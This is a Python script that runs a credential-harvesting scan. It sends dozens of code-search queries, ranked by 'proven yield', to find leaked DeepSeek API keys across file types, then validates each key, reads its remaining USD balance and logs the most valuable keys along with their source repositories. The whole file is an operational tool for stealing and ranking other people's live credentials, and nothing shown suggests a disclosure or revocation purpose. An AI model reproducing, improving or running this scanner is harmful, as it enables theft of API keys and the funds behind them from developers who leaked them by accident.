#!/usr/bin/env python3
"""Deep optimized scan — serialized searches, entropy filtering, prioritized queries."""
import sys, time, os, json
sys.path.insert(0, ".")

from scanner_engine import ScannerEngine, BUILTIN_QUERIES, is_bad_key

# Reorder queries by proven yield (based on 6-hour scan results)
# High-yield queries first: Java, Properties, Python, Env, Config
HIGH_YIELD_FIRST = [
    # === Tier 1: Consistently highest yield ===
    "deepseek sk- filename:java",
    "deepseek sk- filename:properties",
    "deepseek sk- filename:py NOT env",
    "deepseek sk- filename:env",
    "deepseek sk- filename:yml",
    "deepseek sk- filename:json",
    "deepseek sk- filename:kt",
    "deepseek sk- filename:php",
    "deepseek sk- filename:js",
    "deepseek sk- filename:go",
    "deepseek sk- filename:config",
    "deepseek sk- filename:sh",
    "deepseek sk- filename:ts",
    "DEEPSEEK_API_KEY sk-",
    "api.deepseek.com sk- filename:py",
    "deepseek sk- filename:env.local",
    "deepseek sk- filename:env.production",
    "deepseek sk- filename:dart",
    "deepseek sk- filename:credentials",
    "deepseek sk- filename:dockerfile",
    "deepseek sk- filename:ipynb",
    # === Tier 2: Good yield ===
    "deepseek sk- filename:ini",
    "deepseek sk- filename:toml",
    "deepseek sk- filename:yaml",
    "deepseek sk- filename:conf",
    "deepseek sk- filename:cfg",
    "deepseek sk- filename:swift",
    "deepseek sk- filename:gradle",
    "DEEPSEEK_KEY sk-",
    "deepseek_api_key sk-",
    "deepseek sk- path:src/main/resources",
    "deepseek sk- filename:env.development",
    "deepseek sk- filename:env.example",
    "deepseek sk- filename:env.sample",
    "deepseek sk- filename:env.backup",
    "deepseek sk- filename:secrets",
    "deepseek Authorization Bearer sk-",
    "deepseek sk- filename:rb",
    "deepseek sk- filename:rs",
    "deepseek sk- filename:cpp",
    "deepseek sk- filename:cs",
    "deepseek sk- filename:lua",
    "deepseek sk- filename:fish",
    "deepseek sk- filename:zsh",
    "deepseek sk- filename:bash",
    "deepseek sk- filename:txt",
    "deepseek sk- filename:md",
    "deepseek sk- filename:html",
    "DEEPSEEK_TOKEN sk-",
    "DEEPSEEK_API_TOKEN sk-",
    "api.deepseek.com OpenAI sk-",
    "deepseek base_url sk-",
    "deepseek OpenAIClient sk-",
    "deepseek sk- filename:plist",
    "deepseek sk- filename:envrc",
    # === Tier 3: Niche but occasionally valuable ===
    "deepseek process.env sk- filename:js",
    "deepseek sk- filename:py pushed:>2025-01-01",
    "deepseek sk- filename:docker-compose",
    "deepseek.com sk- filename:yml path:.github",
    "deepseek sk- filename:lua path:nvim",
]

def log(msg, level="info"):
    prefix = {"warning": "[!] ", "error": "[ERR] "}.get(level, "")
    t = time.strftime("%m-%d %H:%M:%S")
    print(f"[{t}] {prefix}{msg}", flush=True)

# Duration: 1 hour single run (or pass --hours N)
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("--hours", type=float, default=1.0, help="Hours to run")
args = parser.parse_args()

DURATION = int(args.hours * 3600)
CYCLES = max(1, int(args.hours * 3))  # ~3 cycles per hour
queries = HIGH_YIELD_FIRST * CYCLES

log(f"DEEP SCAN: {len(queries)} queries ({len(HIGH_YIELD_FIRST)} unique x {CYCLES} cycles), {DURATION}s")
log(f"Improvements: prioritized queries, serialized search, entropy filtering, file lock")

engine = ScannerEngine(
    concurrency=12,           # Moderate concurrency
    timeout=20,
    search_delay=6.0,         # 6s between queries (10/min, well under 30/min limit)
    scan_pages=3,             # Full coverage
    max_duration=DURATION,
    max_valid_keys=0,
    output_dir="./results/.tmp_batch",
)

t0 = time.time()
results = engine.run(queries)
elapsed = time.time() - t0

valid = [r for r in results if r.get("valid")]
pos = [r for r in valid if r.get("balance_usd", 0) > 0]
total = sum(r["balance_usd"] for r in pos)

log(f"\n{'='*60}")
log(f"DEEP SCAN COMPLETE: {elapsed:.0f}s")
log(f"Valid: {len(valid)} | Positive: {len(pos)} | Value: ${total:.2f}")
if pos:
    for r in sorted(pos, key=lambda x: x["balance_usd"], reverse=True)[:10]:
        src = r["repos"][0]["repo"] if r.get("repos") else "N/A"
        log(f"  {r['key_preview']} | ${r['balance_usd']:.2f} | {src[:50]}")
